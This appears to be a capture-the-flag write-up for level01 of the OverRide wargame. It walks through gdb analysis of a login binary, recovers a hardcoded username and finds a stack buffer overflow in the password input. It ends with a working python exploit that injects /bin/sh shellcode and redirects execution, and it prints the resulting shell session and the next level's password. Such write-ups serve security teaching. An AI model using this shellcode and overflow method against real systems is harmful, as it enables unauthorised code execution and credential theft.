[README](../README.md)
# level01

```
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username:
verifying username....

nope, incorrect username...

```

## gdb analysis
- in main there are 2 fgets call, the first for the username and the second for password. the first buffer of first fgets is passed to the following function to verify if username is correct:
`0x0804852d <+93>:	call   0x8048464 <verify_user_name>`
- (gdb) disas 0x8048464: the function does compare the buffer with 7 characters (0x7) of a string stored at address 0x80486a8:
```
   0x0804847d <+25>:	mov    $0x80486a8,%eax
   0x08048482 <+30>:	mov    $0x7,%ecx

```
- 
```
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```
- we have username. 
- second fgets buffer for the user input password expose a vulnerability because it is bigger ( `0x08048565 <+149>:	movl   $0x64,0x4(%esp)`) than the stack frame (`  0x080484d8 <+8>:	sub    $0x60,%esp
`) => 0x64 bytes vs 0x60 bytes = buffer is 100 bytes and stack frame is 96
- the logic of checking the return of verify_user_pass called  at <+176> is not correct , because the return stored in eax is compared to 0X0 (0=success) and even if the function return 0 we jump (je) to <+199> where the "nope..." at address 0x804871e is puts.

## payload
- we find the offset of second fgets buffer using a pattern generator:
```
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
=> offset is 80 bytes
- we find the address of first fgets buffer:
```
0x08048521 <+81>:	movl   $0x804a040,(%esp)
0x08048528 <+88>:	call   0x8048370 <fgets@plt>
```
=> 0x804a040
- we want to overflow the buffer of second gets with shellcode, to do so we need to craft the payload with: corect username to pass to second fgets buffer + shell code + padding of 80 to overflow the buffer and execute the shellcode + address of buffer of first fgets + 7 characters (the n. of characters of username dat_wil) to overwrite the return address (writing in eip) and redirect the execution flow back to a valid part of the program after the shellcode has executed:
```
level01@OverRide:~$ python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A'*80 + '\x47\xa0\x04\x08'" > /tmp/exploit
level01@OverRide:~$ cat /tmp/exploit - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

